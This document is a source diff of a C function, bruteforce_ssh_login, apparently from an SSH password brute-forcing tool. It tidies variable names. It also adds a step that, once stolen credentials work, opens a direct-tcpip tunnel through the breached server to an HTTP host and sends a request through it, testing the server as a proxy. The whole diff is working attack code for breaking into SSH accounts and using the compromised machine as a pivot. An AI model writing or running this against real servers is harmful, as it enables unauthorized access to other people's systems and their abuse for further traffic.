@@ -52,52 +52,54 @@ int bruteforce_ssh_login(btkg_context_t *context, const char *hostname,
 			 uint16_t port, const char *username,
 			 const char *password)
 {
-	ssh_session my_ssh_session;
+	ssh_session session;
 	int verbosity = 0;
+	btkg_options_t *options = &context->options;
 
-	if (context->options.verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
+	if (options->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
 		verbosity = SSH_LOG_PROTOCOL;
 	} else {
 		verbosity = SSH_LOG_NOLOG;
 	}
 
-	my_ssh_session = ssh_new();
+	session = ssh_new();
 
-	if (my_ssh_session == NULL) {
+	if (session == NULL) {
 		log_error("Cant create SSH session.");
+
 		return -1;
 	}
 
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &(int){port});
+	ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
+	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
+	ssh_options_set(session, SSH_OPTIONS_PORT, &(int){ port });
 #if LIBSSH_VERSION_MAYOR > 0 ||                                                \
 	(LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
+	ssh_options_set(session, SSH_OPTIONS_KEY_EXCHANGE, "none");
+	ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "none");
 #endif
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT,
-			&context->options.timeout);
-	ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);
+	ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &options->timeout);
+	ssh_options_set(session, SSH_OPTIONS_USER, username);
 
 	int r;
-	r = ssh_connect(my_ssh_session);
+	r = ssh_connect(session);
 	if (r != SSH_OK) {
-		if (context->options.verbose & CBRUTEKRAG_VERBOSE_MODE) {
+		if (options->verbose & CBRUTEKRAG_VERBOSE_MODE) {
 			log_error("[!] Error connecting to %s:%d %s.", hostname,
-				  port, ssh_get_error(my_ssh_session));
+				  port, ssh_get_error(session));
 		}
-		ssh_free(my_ssh_session);
+		ssh_free(session);
+
 		return -1;
 	}
 
-	r = ssh_userauth_none(my_ssh_session, NULL);
+	r = ssh_userauth_none(session, NULL);
 
 	if (r == SSH_AUTH_SUCCESS) {
 		log_debug("[!] %s:%d - Server without authentication.",
 			  hostname, port);
-		ssh_disconnect(my_ssh_session);
-		ssh_free(my_ssh_session);
+		ssh_disconnect(session);
+		ssh_free(session);
 
 		return -1;
 	}
@@ -106,28 +108,99 @@ int bruteforce_ssh_login(btkg_context_t *context, const char *hostname,
 		log_debug(
 			"[!] %s:%d - ssh_userauth_none(): A serious error happened.",
 			hostname, port);
-		ssh_disconnect(my_ssh_session);
-		ssh_free(my_ssh_session);
+		ssh_disconnect(session);
+		ssh_free(session);
 
 		return -1;
 	}
 
-	int method = 0;
-
-	method = ssh_userauth_list(my_ssh_session, NULL);
+	int method = ssh_userauth_list(session, NULL);
 
 	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
-		r = ssh_userauth_password(my_ssh_session, NULL, password);
+		r = ssh_userauth_password(session, NULL, password);
 		if (r == SSH_AUTH_SUCCESS) {
-			ssh_disconnect(my_ssh_session);
-			ssh_free(my_ssh_session);
+			/* Credentials accepted */
+
+			if (options->check_http != NULL) {
+				// Open a new channel
+				ssh_channel channel = ssh_channel_new(session);
+				if (channel == NULL) {
+					log_error("Error ssh_channel_new: %s",
+						  ssh_get_error(session));
+					ssh_disconnect(session);
+					ssh_free(session);
+
+					return -2;
+				}
+
+				// Open a "direct-tcpip" channel to the HTTP server through the SSH server
+				log_debug("%s:%d %s %s - Opening tunnel...",
+					  hostname, port, username, password);
+				r = ssh_channel_open_forward(
+					channel, options->check_http, 80,
+					"localhost", 0);
+				if (r != SSH_OK) {
+					log_error(
+						"Error ssh_channel_open_forward: %s",
+						ssh_get_error(session));
+					ssh_disconnect(session);
+					ssh_free(session);
+
+					return -3;
+				}
+
+				char buffer[1024];
+				int nbytes;
+
+				snprintf(buffer, sizeof(buffer),
+					 "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
+					 options->check_http);
+
+				// Send HTTP request through the channel
+				r = ssh_channel_write(channel, buffer,
+						      (uint32_t)strlen(buffer));
+				if (r == SSH_ERROR) {
+					log_error("Error ssh_channel_write: %s",
+						  ssh_get_error(session));
+					ssh_disconnect(session);
+					ssh_free(session);
+
+					return -4;
+				}
+
+				// Read HTTP response from the channel
+				nbytes = ssh_channel_read(channel, buffer,
+							  sizeof(buffer), 0);
+
+				if (nbytes == 0) {
+					log_warn(
+						"%s:%d %s %s - http-check empty response",
+						hostname, port, username,
+						password);
+					ssh_disconnect(session);
+					ssh_free(session);
+
+					return -6;
+				}
+
+				if (nbytes < 0) {
+					log_error("Error ssh_channel_read: %s",
+						  ssh_get_error(session));
+					ssh_disconnect(session);
+					ssh_free(session);
+
+					return -5;
+				}
+			}
+			ssh_disconnect(session);
+			ssh_free(session);
 
 			return 0;
 		}
 	}
 
-	ssh_disconnect(my_ssh_session);
-	ssh_free(my_ssh_session);
+	ssh_disconnect(session);
+	ssh_free(session);
 	return -1;
 }
 
